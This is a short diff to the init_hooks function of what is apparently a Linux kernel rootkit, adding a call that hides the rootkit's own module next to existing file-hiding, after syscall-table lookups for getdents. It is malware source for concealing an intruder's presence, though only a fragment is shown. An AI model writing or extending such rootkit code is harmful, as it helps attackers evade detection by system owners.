@@ -57,6 +57,9 @@ init_hooks(void)
     sys_getdents = (void *)sys_calls[__NR_getdents];
     sys_getdents64 = (void *)sys_calls[__NR_getdents64];
 
+    if (rootkit.hiding_module)
+        hide_module();
+
     if (rootkit.hiding_files)
         hide_files();
 
